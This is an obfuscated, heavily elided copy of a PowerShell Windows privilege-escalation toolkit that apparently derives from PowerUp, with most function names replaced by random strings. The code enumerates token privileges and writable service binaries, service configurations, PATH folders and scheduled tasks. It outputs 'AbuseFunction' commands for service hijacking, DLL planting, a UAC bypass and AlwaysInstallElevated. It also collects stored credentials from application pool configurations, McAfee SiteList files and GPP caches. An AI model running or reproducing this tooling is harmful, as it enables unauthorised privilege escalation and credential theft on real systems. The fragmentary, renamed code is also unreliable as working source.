...
function 2KYENZPZ {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenGroups = 8E9TPMBA -TokenHandle $hProcToken -InformationClass 'Groups'
...
function 9RSU0TRO {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                8E9TPMBA -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
...
function E876EJWA {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenType = 8E9TPMBA -TokenHandle $hProcToken -InformationClass 'Type'
...
function 7ASHHF3U {
    ...
    PROCESS {
        ForEach($ServiceName in $Name) {
            ...
            try {
                Write-Verbose "7ASHHF3U IndividualService : $($IndividualService.Name)"
...
function V99P3I99 {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = $IndividualService | 7ASHHF3U
...
function 0989EH2H {
    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $ModifiableFiles = $ConcatPathArray | LXNMWZTP

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $CanRestart = V99P3I99 -PermissionSet 'Restart' -Name $Service.name
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "F3467H4V -Name '$($Service.name)' -Path <HijackPath>"
...
function X8RU8Z99 {
    ...
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
        ...
        $ServicePath | LXNMWZTP | ForEach-Object {
            $CanRestart = V99P3I99 -PermissionSet 'Restart' -Name $ServiceName
            $Out = New-Object PSObject
            ...
            $Out | Add-Member Noteproperty 'AbuseFunction' "JS6DFSNK -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
...
function 264POV71 {
    ...
    Get-Service | V99P3I99 -PermissionSet 'ChangeConfig' | ForEach-Object {
        $ServiceDetails = $_ | OIWSSCBE
        $CanRestart = $_ | V99P3I99 -PermissionSet 'Restart'
        $Out = New-Object PSObject
        ...
        $Out | Add-Member Noteproperty 'AbuseFunction' "NPXN4DWE -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
        $Out | Add-Member Aliasproperty Name ServiceName
...
function NPXN4DWE {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            $ServiceDetails = $TargetService | OIWSSCBE
            ...
            ForEach($ServiceCommand in $ServiceCommands) {
                ...
                $Success = $TargetService | TWUPFG1H -Path "$ServiceCommand"
            ...
            $Success = $TargetService | TWUPFG1H -Path "$OriginalServicePath"
...
function JS6DFSNK {
    ...
    PROCESS {
        ...
        $ServiceDetails = $TargetService | OIWSSCBE
        $ModifiableFiles = $ServiceDetails.PathName | LXNMWZTP -Literal
        ...
        $Result = F3467H4V -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
...
function ML0V57IY {
    ...
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | LXNMWZTP -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
    ...
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            ...
            if ($TaskXML.Task.Triggers) {
                ...
                $TaskXML.Task.Actions.Exec.Command | LXNMWZTP | ForEach-Object {
                    $Out = New-Object PSObject
                ...
                $TaskXML.Task.Actions.Exec.Arguments | LXNMWZTP | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
...
function K5HMKUQF {
    ...
    Write-Verbose "Running K5HMKUQF"
    ...
    $Checks = @(
        ...
        @{
            ...
            Command     = { if ((2KYENZPZ | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
            AbuseScript = { 'Invoke-WScriptUACBypass -Command "..."' }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { 9RSU0TRO -Special | Where-Object {$_} }
        },
        ...
        @{
            ...
            Command     = { ML0V57IY }
            AbuseScript = { "P8F0AXG4 -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" }
        },
        
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (8MOGF5FA){ New-Object PSObject } }
            AbuseScript = { 'LMVKQM5P' }
        },
        @{
        ...
        @{
            ...
            Command = { EQFLLB0I | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { 56720GKS | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { BQYW9I0A | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { 1IOTIPWU | Where-Object {$_} }
        }
    )
...
$Module = VW7BC0HE -ModuleName PowerUpModule
...
Set-Alias Get-CurrentUserTokenGroupSid 2KYENZPZ
Set-Alias Invoke-AllChecks K5HMKUQF
